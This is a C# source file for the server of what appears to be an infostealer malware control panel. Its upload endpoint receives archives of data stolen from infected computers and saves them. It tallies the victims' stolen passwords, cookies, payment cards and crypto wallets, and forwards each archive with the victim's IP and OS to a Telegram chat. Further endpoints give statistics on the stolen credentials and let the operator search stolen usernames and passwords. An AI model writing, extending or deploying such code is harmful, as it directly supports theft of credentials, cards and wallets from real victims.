using System.Collections.Concurrent;
using System.IO;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Mirage.Panel.Data;
using Mirage.Panel.Helpers;

namespace Mirage.Panel.Services;

public class PanelServer
{
    private WebApplication? _app;
    private readonly IDbContextFactory<AppDbContext> _dbFactory;
    private readonly LogProcessor _logProcessor;
    private readonly TelegramProxy _telegram;

    public int Port { get; private set; } = 5000;
    public string AuthToken { get; private set; } = Guid.NewGuid().ToString("N");
    public string? TelegramToken { get; set; }
    public string? TelegramChatId { get; set; }

    private static readonly ConcurrentDictionary<string, RateLimitEntry> _rateLimits = new();
    private static readonly ConcurrentDictionary<string, int> _failedAttempts = new();
    private const int MaxRequestsPerMinute = 60;
    private const long MaxPayloadSize = 100L * 1024 * 1024;
    private const int MaxFailedAttempts = 10;

    public PanelServer(IDbContextFactory<AppDbContext> dbFactory, LogProcessor logProcessor, TelegramProxy telegram)
    {
        _dbFactory = dbFactory;
        _logProcessor = logProcessor;
        _telegram = telegram;
    }

    public void Start()
    {
        var builder = WebApplication.CreateBuilder(new WebApplicationOptions());
        builder.Services.AddDbContextFactory<AppDbContext>(opts =>
            opts.UseSqlite("Data Source=mirage_panel.db"));

        var app = builder.Build();
        app.Urls.Add($"http://127.0.0.1:{Port}");

        app.Use(async (ctx, next) =>
        {
            var ip = ctx.Connection.RemoteIpAddress?.ToString() ?? "unknown";
            var auth = ctx.Request.Headers.Authorization.FirstOrDefault();

            var rateEntry = _rateLimits.GetOrAdd(ip, _ => new RateLimitEntry());
            lock (rateEntry)
            {
                if (rateEntry.ResetTime < DateTime.UtcNow)
                {
                    rateEntry.Count = 0;
                    rateEntry.ResetTime = DateTime.UtcNow.AddMinutes(1);
                }
                rateEntry.Count++;
                if (rateEntry.Count > MaxRequestsPerMinute)
                {
                    ctx.Response.StatusCode = 429;
                    return;
                }
            }

            var token = auth?.StartsWith("Bearer ") == true ? auth["Bearer ".Length..] : null;
            if (token != AuthToken && ctx.Request.Path != "/api/stats")
            {
                if (token != null)
                {
                    var fails = _failedAttempts.AddOrUpdate(ip, 1, (_, c) => c + 1);
                    if (fails > MaxFailedAttempts)
                    {
                        var failEntry = _rateLimits.GetOrAdd(ip, _ => new RateLimitEntry());
                        lock (failEntry) { failEntry.Count = int.MaxValue; failEntry.ResetTime = DateTime.MaxValue; }
                    }
                }
                ctx.Response.StatusCode = 401;
                return;
            }
            await next();
        });

        app.MapPost("/api/log", async (HttpRequest req) =>
        {
            if (!req.HasFormContentType) return Results.BadRequest();
            if (req.ContentLength > MaxPayloadSize) return Results.StatusCode(413);

            var form = await req.ReadFormAsync();
            var archive = form.Files.GetFile("archive");
            var metadata = form["metadata"].FirstOrDefault();
            if (archive == null || archive.Length > MaxPayloadSize)
                return Results.BadRequest();

            using var ms = new MemoryStream((int)archive.Length);
            await archive.CopyToAsync(ms);
            var archiveBytes = ms.ToArray();

            // Save raw ZIP to logs/ directory
            try
            {
                var logsDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "logs");
                Directory.CreateDirectory(logsDir);
                var ts = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");
                var zipPath = Path.Combine(logsDir, $"log_{ts}_{Guid.NewGuid():N}.zip");
                await File.WriteAllBytesAsync(zipPath, archiveBytes);
            }
            catch { }

            var session = _logProcessor.Process(archiveBytes, metadata ?? "");

            // Forward to Telegram if configured
            if (!string.IsNullOrEmpty(TelegramToken) && !string.IsNullOrEmpty(TelegramChatId) && session != null)
            {
                var flag = session.CountryCode != null ? Flags.GetFlag(session.CountryCode) : "";
                var caption = $"New log {flag}\n" +
                    $"IP: {session.Ip}\n" +
                    $"OS: {session.Os}\n" +
                    $"Passwords: {session.Passwords.Count}\n" +
                    $"Cookies: {session.Cookies.Count}\n" +
                    $"Cards: {session.Cards.Count}\n" +
                    $"Wallets: {session.Wallets.Count}";

                if (caption.Length > 1000) caption = caption[..997] + "...";
                _ = _telegram.SendLog(TelegramToken, TelegramChatId, archiveBytes, $"log_{session.Id}.zip", caption);
            }

            return Results.Ok();
        });

        app.MapGet("/api/stats", (HttpRequest req) =>
        {
            using var db = _dbFactory.CreateDbContext();
            var sessions = db.Sessions.Count();
            var passwords = db.Passwords.Count();
            var cookies = db.Cookies.Count();
            var wallets = db.Wallets.Count();
            var cards = db.Cards.Count();
            var today = db.Sessions.Count(s => s.CreatedAt.Date == DateTime.UtcNow.Date);

            // Geo distribution
            var geo = db.Sessions
                .Where(s => s.CountryCode != null)
                .GroupBy(s => s.CountryCode)
                .Select(g => new { country = g.Key, count = g.Count() })
                .OrderByDescending(x => x.count)
                .ToList();

            // Browser distribution (from password table)
            var browsers = db.Passwords
                .Where(p => p.Browser != null)
                .GroupBy(p => p.Browser)
                .Select(g => new { browser = g.Key, count = g.Count() })
                .OrderByDescending(x => x.count)
                .ToList();

            // Timeline (30 days)
            var from = DateTime.UtcNow.AddDays(-30);
            var timeline = db.Sessions
                .Where(s => s.CreatedAt >= from)
                .AsEnumerable()
                .GroupBy(s => s.CreatedAt.Date)
                .Select(g => new { date = g.Key.ToString("yyyy-MM-dd"), count = g.Count() })
                .OrderBy(x => x.date)
                .ToList();

            // Top password domains
            var topPasswords = db.Passwords
                .Where(p => p.Url != null)
                .AsEnumerable()
                .GroupBy(p => ExtractDomain(p.Url!))
                .Select(g => new { domain = g.Key, count = g.Count() })
                .OrderByDescending(x => x.count)
                .Take(10)
                .ToList();

            return Results.Json(new { sessions, passwords, cookies, wallets, cards, today, geo, browsers, timeline, topPasswords });
        });

        app.MapGet("/api/search", (string? q) =>
        {
            if (string.IsNullOrWhiteSpace(q)) return Results.Json(Array.Empty<object>());
            using var db = _dbFactory.CreateDbContext();
            var results = db.Passwords
                .Where(p => p.Url!.Contains(q) || p.Username!.Contains(q) || p.PasswordValue!.Contains(q))
                .Take(100).ToList();
            return Results.Json(results);
        });

        _ = app.StartAsync();
        _app = app;
    }

    public void Stop()
    {
        try { _app?.StopAsync().GetAwaiter().GetResult(); } catch { }
    }

    private static string ExtractDomain(string url)
    {
        try
        {
            var uri = new Uri(url);
            return uri.Host.Replace("www.", "");
        }
        catch { return url; }
    }

    private class RateLimitEntry
    {
        public int Count;
        public DateTime ResetTime = DateTime.UtcNow.AddMinutes(1);
    }
}
